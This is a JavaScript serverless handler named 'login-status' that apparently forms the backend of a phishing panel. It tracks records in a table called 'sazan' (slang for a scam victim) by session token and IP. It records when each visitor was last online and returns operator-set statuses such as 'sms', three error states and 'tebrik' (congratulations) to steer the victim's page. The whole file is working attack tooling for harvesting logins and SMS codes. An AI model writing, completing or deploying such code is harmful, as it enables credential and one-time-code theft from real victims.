const { query, withTransaction } = require('../../lib/db');
const { getClientIp } = require('../../lib/ip');
const { getUnixTimestampPlus } = require('../../lib/time');
const { getSessionToken } = require('../../lib/session');

async function consumeStatusRow(client, tableName, columnName, value) {
  const result = await client.query(
    `DELETE FROM ${tableName} WHERE ${columnName} = $1 RETURNING id`,
    [value],
  );
  return result.rowCount > 0;
}

exports.handler = async function handler(event) {
  if (event.httpMethod !== 'GET') {
    return { statusCode: 405, body: JSON.stringify({ message: 'Yalnızca GET desteklenir.' }) };
  }

  try {
    const sessionToken = getSessionToken(event.headers);
    if (!sessionToken) {
      return { statusCode: 200, body: JSON.stringify({ status: null }) };
    }

    const sazanResult = await query('SELECT id FROM sazan WHERE session_token = $1 LIMIT 1', [sessionToken]);
    if (!sazanResult.rowCount) {
      return { statusCode: 200, body: JSON.stringify({ status: null }) };
    }

    const recordId = sazanResult.rows[0].id;
    const ip = getClientIp(event);
    const lastOnline = getUnixTimestampPlus(7);

    await query(
      `INSERT INTO ips (ipAddress, lastOnline)
       VALUES ($1, $2)
       ON CONFLICT (ipAddress) DO UPDATE SET lastOnline = EXCLUDED.lastOnline`,
      [ip, lastOnline],
    );

    await query('UPDATE sazan SET lastOnline = $1 WHERE id = $2', [lastOnline, recordId]);

    const tables = [
      { table: 'back', column: 'back', status: 'back' },
      { table: 'sms', column: 'sms', status: 'sms' },
      { table: 'hata1', column: 'hata1', status: 'hata1' },
      { table: 'hata2', column: 'hata2', status: 'hata2' },
      { table: 'hata3', column: 'hata3', status: 'hata3' },
      { table: 'tebrik', column: 'tebrik', status: 'tebrik' },
    ];

    const status = await withTransaction(async (client) => {
      for (const entry of tables) {
        const consumed = await consumeStatusRow(client, entry.table, entry.column, ip);
        if (consumed) {
          if (entry.status === 'back') {
            await client.query('UPDATE sazan SET back = 0 WHERE id = $1', [recordId]);
          }
          return entry.status;
        }
      }
      return null;
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ status }),
    };
  } catch (error) {
    console.error('login-status hatası:', error);
    return { statusCode: 500, body: JSON.stringify({ status: null }) };
  }
};